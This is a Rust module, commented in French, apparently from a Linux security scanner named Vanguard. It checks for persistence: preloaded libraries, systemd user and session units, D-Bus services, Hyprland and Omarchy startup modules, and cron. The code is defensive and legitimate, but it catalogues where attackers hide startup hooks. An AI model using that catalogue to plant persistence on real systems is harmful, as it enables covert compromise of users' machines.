/// Le nom du fichier finit par « `.<ext>` », même réduit à lui (vérification 3, H1) : le `find -name '*.lua'` de
/// require_all d'Omarchy prend un fichier nommé « .lua » (`require("")` le charge), alors que `Path::extension()`
/// ne voit aucune extension à un nom qui commence par son seul point.
fn a_l_extension(f: &Path, ext: &str) -> bool {
    let suffixe = format!(".{ext}");
    f.file_name()
        .is_some_and(|n| n.as_encoded_bytes().ends_with(suffixe.as_bytes()))
}

fn fichiers_sous(
    dossier: &Path,
    extensions: &[&str],
    hypr: bool,
    profondeur: u32,
    trouve: &mut Vec<std::path::PathBuf>,
    parcours: &mut Parcours,
) {
    if profondeur > PROFONDEUR_MAX {
        parcours.trop_profonds.push(dossier.to_path_buf());
        return;
    }
    // Dans l'ordre des noms, pas dans celui que rend le système de fichiers (l'ordre de création sur btrfs, celui
    // d'un hachage sur ext4) : le premier refus d'une alerte l'emporte (`Temoins::de`), et le verdict d'une même
    // maison changeait selon le disque où elle était (vérification 4, D1).
    let mut entrees: Vec<std::fs::DirEntry> = std::fs::read_dir(dossier).into_iter().flatten().flatten().collect();
    entrees.sort_by_key(std::fs::DirEntry::file_name);
    for e in entrees {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
        // une autre sortirait de la lecture (et son alerte avec). Un lien vers un dossier, seulement « *.d » (ou
        // sous Hyprland, où Lua le suit) et à profondeur bornée (une boucle s'arrête là, dite).
        let cible = || std::fs::metadata(&p).ok();
        let fichier = t.is_file() || (t.is_symlink() && cible().is_some_and(|m| m.is_file()));
        let ajouts = a_l_extension(&p, "d");
        let sous_dossier = t.is_dir() || ((ajouts || hypr) && t.is_symlink() && cible().is_some_and(|m| m.is_dir()));
        if sous_dossier && (ajouts || hypr) {
            if t.is_symlink() {
                if hypr {
                    parcours.liens_hypr.push(p.clone());
                } else {
                    parcours.liens.push(p.clone());
                }
            }
            fichiers_sous(&p, extensions, hypr, profondeur.saturating_add(1), trouve, parcours);
        } else if fichier && extensions.iter().any(|e| a_l_extension(&p, e)) {
            trouve.push(p);
        }
    }
}

/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
fn source_de(origine: &str, ligne: &str) -> String {
    format!("{origine}#{}", crate::modele::id::trace(ligne))
}

/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
/// pas, deux lignes identiques comptent une fois).
fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
    sources.sort();
    sources.dedup();
    crate::modele::Objet::de("lancements", &sources.join(","))
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    persistance_dans(
        Path::new("/"),
        Path::new(&home()),
        |var| std::env::var_os(var),
        sortie("crontab", &["-l"]),
        Paquets::detecter(),
    )
}

/// Le releveur de `persistance_dans` : la racine lue, le dossier personnel `maison` et les dossiers que les variables
/// de la session (`variable`) y ajoutent, comme systemd et les sessions les lisent.
fn releveur(racine: &Path, maison: &Path, variable: &impl Fn(&str) -> Option<std::ffi::OsString>) -> Releveur {
    // Une variable XDG relative est ignorée par systemd (la spécification XDG) : seule une absolue, ailleurs que le
    // dossier par défaut, ajoute un dossier.
    let deplace = |nom: &str, defaut: &str| {
        variable(nom)
            .map(std::path::PathBuf::from)
            .filter(|p| p.is_absolute() && *p != maison.join(defaut))
    };
    let runtime = variable("XDG_RUNTIME_DIR")
        .map(std::path::PathBuf::from)
        .filter(|p| p.is_absolute());
    let de_systemd = uid_du_compte().map(|uid| std::path::PathBuf::from(format!("/run/user/{uid}")));
    let session = runtime.clone().or_else(|| de_systemd.clone());
    // XDG_RUNTIME_DIR ailleurs que le dossier que systemd donne au compte : un programme du compte peut changer la
    // variable d'où Vanguard est lancé, le gestionnaire de la session lit toujours /run/user/<uid> (relecture
    // adverse, B6). Les deux se lisent.
    let session_de_systemd = de_systemd.filter(|d| Some(d) != session.as_ref());
    let liste = |nom: &str| -> Vec<std::path::PathBuf> {
        variable(nom)
            .map(|v| std::env::split_paths(&v).filter(|p| p.is_absolute()).collect())
            .unwrap_or_default()
    };
    Releveur {
        racine: racine.to_path_buf(),
        maison: maison.to_path_buf(),
        runtime,
        session,
        config: deplace("XDG_CONFIG_HOME", ".config"),
        donnees: deplace("XDG_DATA_HOME", ".local/share"),
        zdot: deplace("ZDOTDIR", ""),
        etat: deplace("XDG_STATE_HOME", ".local/state"),
        modules: Vec::new(),
        hypr_inclus: Vec::new(),
        dossiers_ajoutes: Vec::new(),
        session_de_systemd,
        donnees_systeme: liste("XDG_DATA_DIRS"),
        config_systeme: liste("XDG_CONFIG_DIRS"),
        environnement: None,
        budget: temoins::Budget::default(),
        dbus: std::cell::OnceCell::new(),
    }
}

/// Les dossiers où systemd cherche les unités du compte (systemd --user), du plus prioritaire au moins prioritaire,
/// pour ce dossier personnel et ces variables de session : la liste même du bilan des persistances
/// (`dossiers_d_unites`), pour que `vanguard demarrage` sache quelle unité tourne vraiment (relecture 0.94, C-1).
/// `Err` : pourquoi la liste ne se fait pas (dossier de la session inconnu).
pub(crate) fn dossiers_d_unites_du_compte(
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
    dossiers_d_unites(&releveur(Path::new("/"), maison, &variable), true)
}

/// Les noms des dossiers de compléments (« nom.service.d ») qui s'appliquent à l'unité `nom` (`ajouts_de`).
pub(crate) fn complements_d_unite(nom: &str) -> Vec<String> {
    ajouts_de(nom)
}

/// La persistance lue sous `racine` (« / » au bilan ; une arborescence fabriquée pour le corpus de détection), le
/// dossier personnel `maison`, les variables de cette session (`variable`), la crontab du compte et le gestionnaire
/// de paquets donnés : la même lecture et le même jugement, sans rien toucher hors de la racine.
pub(super) fn persistance_dans(
    racine: &Path,
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
    crontab: Option<String>,
    gestion: Option<Paquets>,
) -> Vec<Constat> {
    // Une racine relative (« » au lieu de « / ») ferait lire ld.so.preload, profile.d, cron.d… sous le dossier
    // courant : rien n'y serait, et le verdict serait « sain » (campagne n° 4, M6).
    debug_assert!(
        racine.is_absolute(),
        "racine de la persistance relative : {}",
        racine.display()
    );
    #[cfg(test)]
    tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
    let mut t = Lancements {
        r: releveur(racine, maison, &variable),
        ..Lancements::default()
    };
    t.r.dossiers_ajoutes = dossiers_ajoutes(&t.r);
    if let (Some(autre), Some(variable)) = (t.r.session_de_systemd.clone(), t.r.runtime.clone())
        && std::fs::symlink_metadata(t.r.sous(&autre)).is_ok()
    {
        let (v, a) = (
            crate::ui::affichable(&t.r.montre(&variable)),
            crate::ui::affichable(&t.r.montre(&autre)),
        );
        let source = format!("session {}", t.r.montre(&variable));
        constat_sans_ligne(
            &mut t,
            &source,
            trf!(
                "XDG_RUNTIME_DIR mène à {v}, pas au dossier de session que systemd donne au compte ({a}) : les deux sont lus ; une session qui change cette variable cache ce qu'elle range",
                "XDG_RUNTIME_DIR leads to {v}, not to the session folder systemd gives the account ({a}): both are read; a session that changes this variable hides what it stores"
            ),
            trf!(
                "XDG_RUNTIME_DIR ({v}) n'est pas le dossier de session de systemd ({a}) : l'alerte ne se déclare pas normale tant qu'ils diffèrent",
                "XDG_RUNTIME_DIR ({v}) is not systemd's session folder ({a}): the alert cannot be declared normal while they differ"
            ),
        );
    }
    // Un dossier personnel inconnu ou relatif : les fichiers du compte se liraient sous le dossier courant, et
    // l'absence de tout y passerait pour « rien de suspect » (campagne E, M-f). C'est dit, non vérifié.
    if !maison.is_absolute() {
        t.sources.push(source_de("maison", "relatif"));
        t.retraits.push(None);
        t.temoins.push(Err(temoins::Refus(
            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
        )));
        t.suspects.push(
            tr!(
                "dossier personnel inconnu ou relatif : les démarrages du compte ne sont pas vérifiés",
                "home folder unknown or relative: the account's startup files are not checked"
            )
            .to_string(),
        );
    }
    // Un dossier personnel absent ou qu'on ne peut pas lire, ou un des dossiers où le compte range ses démarrages :
    // rien n'y serait trouvé, et ce ne serait pas « rien de suspect » (vérifications de la campagne E, N9). Un
    // sous-dossier absent, lui, ne lance rien.
    if maison.is_absolute() {
        for (rang, dossier) in [
            "",
            ".config",
            ".config/systemd",
            ".config/systemd/user",
            ".config/autostart",
            ".config/hypr",
            ".local/share/systemd/user",
        ]
        .into_iter()
        .enumerate()
        {
            let chemin = maison.join(dossier);
            let Err(e) = std::fs::read_dir(&chemin) else {
                continue;
            };
            if rang > 0 && e.kind() == std::io::ErrorKind::NotFound {
                continue;
            }
            let montre = if rang == 0 {
                tr!("le dossier personnel", "the home folder").to_string()
            } else {
                crate::ui::affichable(&t.r.montre(&chemin))
            };
            t.sources
                .push(source_de("maison", &format!("illisible {}", t.r.montre(&chemin))));
            t.retraits.push(None);
            t.temoins.push(Err(temoins::Refus(trf!(
                "{montre} ne se lit pas : les démarrages du compte ne sont pas vérifiés",
                "{montre} cannot be read: the account's startup files are not checked"
            ))));
            t.suspects.push(trf!(
                "{montre} ne se lit pas ({e}) : les démarrages du compte ne sont pas vérifiés",
                "{montre} cannot be read ({e}): the account's startup files are not checked"
            ));
            if rang == 0 {
                break;
            }
        }
    }
    // Les dossiers de la session où systemd range des unités : illisibles, ce qu'ils lancent n'est pas vérifié.
    for session in
        t.r.session
            .iter()
            .chain(&t.r.session_de_systemd)
            .cloned()
            .collect::<Vec<_>>()
    {
        for d in std::iter::once("systemd").chain(DOSSIERS_DE_LA_SESSION) {
            let chemin = t.r.sous(&session.join(d));
            let Err(e) = std::fs::read_dir(&chemin) else {
                continue;
            };
            if e.kind() == std::io::ErrorKind::NotFound {
                continue;
            }
            dossier_illisible(&mut t, &chemin, &e);
        }
    }
    let Demarrage {
        fichiers: mut demarrage,
        mut hypr,
        liens,
        parcours,
        mut modules,
        masques,
    } = fichiers_de_demarrage(&t.r);
    // Une copie conforme de la bibliothèque d'Omarchy fait ce que fait l'original du paquet : dite, pas jugée.
    let copies: Vec<(std::path::PathBuf, std::path::PathBuf)> = hypr
        .iter()
        .filter_map(|f| copie_d_omarchy(&t.r, f).map(|o| (f.clone(), o)))
        .collect();
    for liste in [&mut demarrage, &mut hypr, &mut modules] {
        liste.retain(|f| !copies.iter().any(|(c, _)| c == f));
    }
    t.r.modules = modules;
    juger_parcours(&mut t, &parcours, &masques, &copies);
    for lien in liens.into_iter().filter(|l| !de_root_seul(l)) {
        let montre = crate::ui::affichable(&t.r.montre(&lien));
        // La cible telle qu'elle se montre : « ~/… » dans le dossier personnel, comme les fichiers lus.
        let vers = std::fs::read_link(&lien).map_or_else(
            |_| "?".to_string(),
            |c| {
                let c = if c.is_absolute() {
                    t.r.montre(&t.r.sous(&c))
                } else {
                    c.to_string_lossy().into_owned()
                };
                crate::ui::affichable(&c)
            },
        );
        let source = format!("lien {}", t.r.montre(&lien));
        constat_sans_ligne(
            &mut t,
            &source,
            trf!(
                "{montre} est un lien vers {vers} : systemd y lit des ajouts d'unité, lus et jugés ici aussi",
                "{montre} is a link to {vers}: systemd reads unit additions there, read and judged here too"
            ),
            trf!(
                "{montre} : un dossier d'ajouts d'unité qui est un lien ne peut pas être déclaré normal : remplacez-le par un dossier",
                "{montre}: a unit addition folder that is a link cannot be declared normal: replace it with a folder"
            ),
        );
    }
    let mut configuration = fichiers_de_configuration(&t.r);
    let (environnement, hypr_lus, hypr_non_suivies) = environnement(&t.r, configuration.clone(), hypr.clone());
    t.r.environnement = Some(environnement);
    // Un « source = » de Hyprland que Vanguard ne suit pas (chemin calculé, joker de dossier, borne), ou qui lit un
    // dossier temporaire ou caché : dit, jamais tu (relecture adverse, C7 ; deuxième vérification, N2, N3).
    for (ou, ligne, pourquoi) in hypr_non_suivies {
        let vue = crate::ui::couper(&crate::ui::affichable(&ligne), 90);
        let source = match pourquoi {
            NonSuivi::Borne(_) => "source borne".to_string(),
            _ => format!("source {} {ligne}", ou.rsplit_once(':').map_or(ou.as_str(), |(m, _)| m)),
        };
        let ou = crate::ui::affichable(&ou);
        let (suspect, refus) = match pourquoi {
            NonSuivi::Calcule => (
                trf!(
                    "{ou} : « {vue} » inclut un fichier de Hyprland dont le chemin se calcule : ce qu'il lance n'est pas vérifié",
                    "{ou}: “{vue}” includes a Hyprland file whose path is computed: what it starts is not checked"
                ),
                trf!(
                    "{ou} : une inclusion de Hyprland au chemin calculé ne peut pas être déclarée normale : écrivez le chemin en toutes lettres",
                    "{ou}: a Hyprland inclusion with a computed path cannot be declared normal: write the path out in full"
                ),
            ),
            NonSuivi::Joker => (
                trf!(
                    "{ou} : « {vue} » inclut des fichiers de Hyprland par un joker dans le dossier : non suivis, ce qu'ils lancent n'est pas vérifié",
                    "{ou}: “{vue}” includes Hyprland files through a wildcard in the folder: not followed, what they start is not checked"
                ),
                trf!(
                    "{ou} : une inclusion de Hyprland avec un joker dans le dossier ne peut pas être déclarée normale : écrivez le dossier en toutes lettres",
                    "{ou}: a Hyprland inclusion with a wildcard in the folder cannot be declared normal: write the folder out in full"
                ),
            ),
            NonSuivi::Temporaire => (
                trf!(
                    "{ou} : « {vue} » inclut un fichier de Hyprland rangé dans un dossier temporaire (lu et jugé aussi)",
                    "{ou}: “{vue}” includes a Hyprland file stored in a temporary folder (read and judged too)"
                ),
                trf!(
                    "{ou} : une inclusion de Hyprland depuis un dossier temporaire ne peut pas être déclarée normale : déplacez le fichier",
                    "{ou}: a Hyprland inclusion from a temporary folder cannot be declared normal: move the file"
                ),
            ),
            NonSuivi::Borne(coupes) => (
                trf!(
                    "Hyprland inclut plus de {SOURCES_MAX} fichiers par « source » : {coupes} fichier(s) de Hyprland, à partir de {ou}, ne sont pas lus ; ce qu'ils lancent n'est pas vérifié",
                    "Hyprland includes more than {SOURCES_MAX} files through “source”: {coupes} Hyprland file(s), from {ou} on, are not read; what they start is not checked"
                ),
                trf!(
                    "trop d'inclusions de Hyprland pour les lire toutes ({coupes} non lue(s)) : l'alerte ne peut pas être déclarée normale",
                    "too many Hyprland inclusions to read them all ({coupes} not read): the alert cannot be declared normal"
                ),
            ),
        };
        constat_sans_ligne(&mut t, &source, suspect, refus);
    }
    // Un fichier que Hyprland lit par « source = » hors de ses dossiers lance aussi des programmes : ses lignes se
    // jugent (troisième vérification de la campagne E : ses « env = » étaient lus, pas ses « exec-once »).
    let inclus: Vec<std::path::PathBuf> = hypr_lus.into_iter().filter(|f| !hypr.contains(f)).collect();
    demarrage.extend(inclus.iter().cloned());
    hypr.extend(inclus.iter().cloned());
    t.r.hypr_inclus = inclus;
    lire_prechargement(racine, &variable, gestion, &mut t);
    // Les fichiers de Hyprland sont aussi des fichiers de configuration, après les autres.
    configuration.extend(hypr);
    juger_configuration(&configuration, &demarrage, maison, &mut t);
    juger_demarrage(&demarrage, maison, &mut t);
    juger_generateurs(&mut t);
    juger_cron(racine, crontab, &mut t);
    let services = services_ajoutes(racine, gestion, &mut t.r);
    let mut constats = vec![constat_des_lancements(t)];
    constats.extend(constat_des_copies(&copies, maison));
    constats.extend(services);
    constats
}

/// Le dossier de la bibliothèque d'Omarchy, posé par son paquet.
const OMARCHY: &str = "/usr/share/omarchy";

/// L'original de la bibliothèque d'Omarchy dont `f` est la copie conforme : même chemin relatif (sous
/// ~/.config/hypr : tel quel, sous config/hypr ou sous default/hypr ; sous ~/.config ou ~/.local/state : tel quel),
/// même contenu entier (SHA-256), l'original à root seul. Une telle copie fait ce que fait l'original, que Vanguard
/// ne lit pas (il vient du paquet) : ses lignes ne se comptent pas, la copie se dit (deuxième vérification, les
/// 62 lignes « non lue » de la bibliothèque recopiée).
fn copie_d_omarchy(r: &Releveur, f: &Path) -> Option<std::path::PathBuf> {
    copie_d_omarchy_selon(r, f, &de_root_seul)
}

/// `copie_d_omarchy`, le jugement « à root seul » passé en paramètre (vérification 3, H5) : l'essai le remplace,
/// pour tourner aussi sous `unshare -r`, où rien n'est cru à root.
fn copie_d_omarchy_selon(r: &Releveur, f: &Path, root_seul: &dyn Fn(&Path) -> bool) -> Option<std::path::PathBuf> {
    let omarchy = r.sous(Path::new(OMARCHY));
    let mut candidats = Vec::new();
    let dossiers_hypr = [
        Some(r.maison.join(".config/hypr")),
        r.config.as_ref().map(|c| r.sous(&c.join("hypr"))),
    ];
    for d in dossiers_hypr.into_iter().flatten() {
        if let Ok(rel) = f.strip_prefix(&d) {
            candidats.push(omarchy.join(rel));
            candidats.push(omarchy.join("config/hypr").join(rel));
            candidats.push(omarchy.join("default/hypr").join(rel));
        }
    }
    for base in [".config", ".local/state"] {
        if let Ok(rel) = f.strip_prefix(r.maison.join(base)) {
            candidats.push(omarchy.join(rel));
        }
    }
    let lu = temoins::lire_borne(f, LECTURE_MAX).ok().filter(|l| l.entier)?;
    let empreinte = temoins::sha256_de(&lu.octets);
    candidats.into_iter().find(|o| {
        root_seul(o)
            && temoins::lire_borne(o, LECTURE_MAX).is_ok_and(|l| l.entier && temoins::sha256_de(&l.octets) == empreinte)
    })
}

/// Les copies conformes de la bibliothèque d'Omarchy (`copie_d_omarchy`), dites en information : une ligne par
/// fichier, sans alerte.
fn constat_des_copies(copies: &[(std::path::PathBuf, std::path::PathBuf)], maison: &Path) -> Option<Constat> {
    if copies.is_empty() {
        return None;
    }
    let liste: Vec<String> = copies
        .iter()
        .map(|(c, o)| {
            let o = o.to_string_lossy();
            let o = o.find(OMARCHY).map_or(o.as_ref(), |i| o.get(i..).unwrap_or_default());
            format!("{} = {}", court(c, maison), crate::ui::affichable(o))
        })
        .collect();
    Some(ok(
        "Persistance",
        trf!(
            "{} fichier(s) de Hyprland sont des copies conformes de la bibliothèque d'Omarchy (contenu identique à l'original du paquet, à root) : ils font ce qu'elle fait, leurs lignes ne sont pas comptées : {}.",
            "{} Hyprland file(s) are exact copies of Omarchy's library (same content as the package original, owned by root): they do what it does, their lines are not counted: {}.",
            liste.len(),
            liste.join(" ; ")
        ),
    ))
}

/// Ce que le parcours des dossiers de Hyprland et des modules d'Omarchy a dit (deuxième vérification, N10, N11) : un
/// sous-dossier qui est un lien (suivi, ses modules jugés), un dossier trop profond (non lu), un module qui en masque
/// un autre (jugé aussi). Chacun levé, jamais déclarable ; une copie conforme d'Omarchy ne masque rien qui change.
fn juger_parcours(
    t: &mut Lancements,
    parcours: &Parcours,
    masques: &[std::path::PathBuf],
    copies: &[(std::path::PathBuf, std::path::PathBuf)],
) {
    for lien in &parcours.liens_hypr {
        let montre = crate::ui::affichable(&t.r.montre(lien));
        let vers = std::fs::read_link(lien).map_or_else(
            |_| "?".to_string(),
            |c| crate::ui::affichable(&t.r.montre(&t.r.sous(&c))),
        );
        constat_sans_ligne(
            t,
            &format!("lien hypr {}", t.r.montre(lien)),
            trf!(
                "{montre} est un lien vers {vers} : Hyprland y prend des modules Lua, lus et jugés ici aussi",
                "{montre} is a link to {vers}: Hyprland takes Lua modules there, read and judged here too"
            ),
            trf!(
                "{montre} : un dossier de modules de Hyprland qui est un lien ne peut pas être déclaré normal : remplacez-le par un dossier",
                "{montre}: a Hyprland module folder that is a link cannot be declared normal: replace it with a folder"
            ),
        );
    }
    for dossier in &parcours.trop_profonds {
        let montre = crate::ui::affichable(&t.r.montre(dossier));
        constat_sans_ligne(
            t,
            &format!("profond {}", t.r.montre(dossier)),
            trf!(
                "{montre} est à plus de {PROFONDEUR_MAX} dossiers de profondeur : les modules qu'il contient ne sont pas lus, ce qu'ils lancent n'est pas vérifié",
                "{montre} is more than {PROFONDEUR_MAX} folders deep: the modules it holds are not read, what they start is not checked"
            ),
            trf!(
                "{montre} : un dossier de modules trop profond pour être lu ne peut pas être déclaré normal",
                "{montre}: a module folder too deep to be read cannot be declared normal"
            ),
        );
    }
    for f in masques.iter().filter(|f| !copies.iter().any(|(c, _)| c == *f)) {
        let montre = crate::ui::affichable(&t.r.montre(f));
        constat_sans_ligne(
            t,
            &format!("masque {}", t.r.montre(f)),
            trf!(
                "{montre} : le chargeur d'Omarchy prend ce module Lua avant celui du même nom (de la bibliothèque d'Omarchy ou de ~/.config/hypr) : ce qu'il fait remplace l'original ; ses lignes sont jugées ici aussi",
                "{montre}: Omarchy's loader takes this Lua module before the one with the same name (from Omarchy's library or ~/.config/hypr): what it does replaces the original; its lines are judged here too"
            ),
            trf!(
                "{montre} : un module qui en masque un autre ne peut pas être déclaré normal : retirez-le, ou mettez vos changements dans ~/.config/hypr",
                "{montre}: a module that masks another cannot be declared normal: remove it, or put your changes in ~/.config/hypr"
            ),
        );
    }
}

/// Les lignes signalées par la lecture de la persistance : critiques, suspectes, et d'où vient chacune (`source_de`,
/// sans langue ni numéro de ligne) : l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source
/// s'ajoute (accepter les lignes d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
#[derive(Default)]
struct Lancements {
    critiques: Vec<String>,
    suspects: Vec<String>,
    sources: Vec<String>,
    /// Pour chaque ligne signalée, le fichier et la ligne telle qu'écrite (fin « \r » comprise) qu'un geste de
    /// défense retirerait ; `None` : signalée ailleurs que dans un fichier (variable de la session, crontab du compte).
    retraits: Vec<Option<(String, String)>>,
    /// Pour chaque ligne signalée, ce qu'un choix « normal » lierait (`machine::temoins`), ou pourquoi on ne peut pas.
    temoins: Vec<Result<temoins::Temoin, temoins::Refus>>,
    r: Releveur,
}

/// Ce qu'il faut pour relever ce que désigne une ligne : la racine lue, le dossier personnel, le dossier de la
/// session (XDG_RUNTIME_DIR, où systemd range aussi des unités de l'utilisateur) et le budget du bilan.
#[derive(Default)]
struct Releveur {
    racine: std::path::PathBuf,
    maison: std::path::PathBuf,
    runtime: Option<std::path::PathBuf>,
    /// Le dossier de la session lu pour la détection : XDG_RUNTIME_DIR, sinon celui que systemd donne à ce compte
    /// (`/run/user/<uid>`). Les unités qu'il garde se lisent même quand la variable manque.
    session: Option<std::path::PathBuf>,
    /// XDG_CONFIG_HOME et XDG_DATA_HOME, s'ils mènent ailleurs que les dossiers par défaut du dossier personnel.
    config: Option<std::path::PathBuf>,
    donnees: Option<std::path::PathBuf>,
    /// ZDOTDIR, s'il mène ailleurs que le dossier personnel : zsh y lit .zshenv, .zprofile, .zshrc, .zlogin.
    zdot: Option<std::path::PathBuf>,
    /// XDG_STATE_HOME, s'il mène ailleurs que ~/.local/state : Omarchy y range ses bascules et ses dispositions.
    etat: Option<std::path::PathBuf>,
    /// Les modules Lua qu'Omarchy charge hors de ~/.config/hypr (`MODULES_D_OMARCHY`) : jugés comme ceux de
    /// ~/.config/hypr, sans pouvoir se déclarer normaux (deuxième vérification, N11).
    modules: Vec<std::path::PathBuf>,
    /// Les fichiers que Hyprland lit par « source = » hors de ses dossiers (`environnement`) : leurs lignes de
    /// lancement se jugent comme celles de ~/.config/hypr, sans pouvoir se déclarer normales (troisième vérification).
    hypr_inclus: Vec<std::path::PathBuf>,
    /// Les dossiers d'unités que systemd lit en plus des habituels (`Ajout::Dossier`), tels que lus sous la racine.
    dossiers_ajoutes: Vec<std::path::PathBuf>,
    /// Le dossier de session que systemd donne au compte (`/run/user/<uid>`), quand XDG_RUNTIME_DIR mène ailleurs : lu
    /// aussi (relecture adverse, B6), ses unités comme celles de `dossiers_ajoutes`.
    session_de_systemd: Option<std::path::PathBuf>,
    /// XDG_DATA_DIRS et XDG_CONFIG_DIRS (chemins absolus seulement), où systemd cherche aussi des unités.
    donnees_systeme: Vec<std::path::PathBuf>,
    config_systeme: Vec<std::path::PathBuf>,
    /// Les lignes des fichiers d'environnement des sessions qui nomment une variable sensible (`environnement`), liées
    /// à chaque ligne déclarée normale ; `None` : pas relevées, donc rien ne se déclare.
    environnement: Option<Result<(String, temoins::Etat), temoins::Refus>>,
    budget: temoins::Budget,
    /// `dossiers_dbus`, calculés une fois (chacun jugé par `de_root_seul`).
    dbus: std::cell::OnceCell<Vec<std::path::PathBuf>>,
}

impl Releveur {
    /// Un fichier des dossiers de Hyprland (~/.config/hypr, ou celui d'un XDG_CONFIG_HOME déplacé).
    fn dans_hypr(&self, f: &Path) -> bool {
        f.starts_with(self.maison.join(".config/hypr"))
            || self
                .config
                .as_ref()
                .is_some_and(|c| f.starts_with(self.sous(&c.join("hypr"))))
    }

    /// `dans_hypr` par le chemin réel : le fichier lui-même, une fois ses liens suivis, est sous le dossier
    /// personnel réel (ou le XDG_CONFIG_HOME réel), puis « .config/hypr » (ou « hypr ») sans lien. Un lien (le
    /// fichier, ~/.config/hypr ou un sous-dossier) qui mène ailleurs en sort : la ligne vit hors de ~/.config/hypr.
    fn dans_hypr_reel(&self, f: &Path) -> bool {
        let Ok(reel) = std::fs::canonicalize(f) else {
            return false;
        };
        let sous_reel =
            |base: &Path, reste: &str| std::fs::canonicalize(base).is_ok_and(|b| reel.starts_with(b.join(reste)));
        sous_reel(&self.maison, ".config/hypr")
            || self.config.as_ref().is_some_and(|c| sous_reel(&self.sous(c), "hypr"))
    }

    /// Un fichier d'unités de l'utilisateur lu dans le dossier personnel, ou dans un XDG_CONFIG_HOME ou
    /// XDG_DATA_HOME déplacé : pas sous /etc/systemd/user, que seul root devrait écrire.
    fn du_compte(&self, f: &Path) -> bool {
        !f.starts_with(self.sous(Path::new("/etc/systemd/user")))
            && (f.starts_with(&self.maison)
                || [&self.config, &self.donnees]
                    .into_iter()
                    .flatten()
                    .any(|d| f.starts_with(self.sous(d))))
    }

    /// Les dossiers de services D-Bus de la session que le compte écrit (~/.local/share/dbus-1/services, et celui d'un
    /// XDG_DATA_HOME déplacé), tels que lus sous la racine : le bus y prend d'abord le programme d'un nom demandé.
    fn dossiers_dbus(&self) -> &[std::path::PathBuf] {
        self.dbus.get_or_init(|| self.calculer_dbus())
    }

    fn calculer_dbus(&self) -> Vec<std::path::PathBuf> {
        let mut d = vec![self.maison.join(".local/share/dbus-1/services")];
        d.extend(self.donnees.as_ref().map(|x| self.sous(&x.join("dbus-1/services"))));
        // Le bus de la session lit aussi XDG_RUNTIME_DIR/dbus-1/services et chaque XDG_DATA_DIRS/dbus-1/services
        // (vérification 3, P6) : ceux du dossier de session, et tout dossier de XDG_DATA_DIRS que root n'est pas seul
        // à pouvoir écrire (dossier personnel, temporaire, ouvert à tous).
        for s in [&self.runtime, &self.session, &self.session_de_systemd]
            .into_iter()
            .flatten()
        {
            d.push(self.sous(&s.join("dbus-1/services")));
        }
        for x in &self.donnees_systeme {
            let dossier = self.sous(&x.join("dbus-1/services"));
            if !de_root_seul(&dossier) {
                d.push(dossier);
            }
        }
        let mut vus = std::collections::BTreeSet::new();
        d.retain(|x| vus.insert(x.clone()));
        d
    }

    /// Un fichier du dossier de la session (XDG_RUNTIME_DIR/systemd) : unités et générateurs que systemd y range.
    fn de_la_session(&self, f: &Path) -> bool {
        self.session
            .as_ref()
            .is_some_and(|d| f.starts_with(self.sous(&d.join("systemd"))))
    }

    /// Un chemin absolu de l'ordinateur, lu sous la racine (une arborescence fabriquée pour les essais et le
    /// corpus) ; le dossier personnel y est déjà.
    fn sous(&self, chemin: &Path) -> std::path::PathBuf {
        if self.racine == Path::new("/") || chemin.starts_with(&self.racine) {
            chemin.to_path_buf()
        } else {
            self.racine.join(chemin.strip_prefix("/").unwrap_or(chemin))
        }
    }

    /// Un chemin lu, tel qu'il se montre et se lie : « ~/… » dans le dossier personnel (le même fichier pour le
    /// même compte), sinon absolu, sans la racine fabriquée. Pas nettoyé ici (`court`) : le témoin lie le chemin
    /// exact et ne nettoie que ce qu'il montre.
    fn montre(&self, lu: &Path) -> String {
        if let Ok(r) = lu.strip_prefix(&self.maison) {
            return format!("~/{}", r.to_string_lossy());
        }
        if self.racine != Path::new("/")
            && let Ok(r) = lu.strip_prefix(&self.racine)
        {
            return format!("/{}", r.to_string_lossy());
        }
        lu.to_string_lossy().into_owned()
    }
}

/// Où se trouve une ligne de démarrage : la façon de lire sa commande en dépend (`designes::Contexte`).
#[derive(Clone, Copy, PartialEq, Eq)]
enum Sorte {
    /// Une unité systemd, de l'utilisateur ou du système.
    Unite {
        utilisateur: bool,
    },
    Bureau,
    Shell,
    /// Un lancement que la détection voit depuis ce lot, sans qu'il puisse être déclaré normal (`hors_du_perimetre`).
    Ajoutee(Ajout),
}

/// Les lancements vus par le lot de détection de la persistance : levés comme les autres, jamais déclarables.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Ajout {
    /// Une ligne d'unité (ou de .desktop, `bureau`) faite de plusieurs lignes écrites, jointes comme systemd les
    /// joint (« \ » en fin de ligne), ou coupée par une fin de ligne que seul systemd voit (« \r », « \0 »).
    Jointe { bureau: bool, utilisateur: bool },
    /// Une unité du dossier de la session (XDG_RUNTIME_DIR/systemd) : systemd et les programmes du compte l'écrivent.
    Session,
    /// Un raccourci de Hyprland qui lance une commande (« bind… = …, exec, … »), ou un appel Lua qui en lance une.
    Raccourci,
    /// Un lancement de Hyprland précédé de règles (« exec-once = [workspace 2] … »).
    LancementHypr,
    /// Un générateur de systemd, lancé à chaque démarrage de la session (pas une ligne : un programme).
    Generateur,
    /// Une ligne de Hyprland faite de plusieurs lignes écrites, jointes par « \\ » en fin de ligne comme hyprlang.
    JointeHypr,
    /// Une clé de Hyprland qui charge ou lance (« plugin = », hypridle), une variable qui fait du bouton « exec », ou
    /// un appel Lua dont la commande ne se lit pas : ce qui se lance ne se lie pas à la ligne.
    CleHypr,
    /// Un réglage d'unité qui change ce qui se lance sans ligne Exec (Environment=LD_PRELOAD…, ExecSearchPath=).
    Reglage,
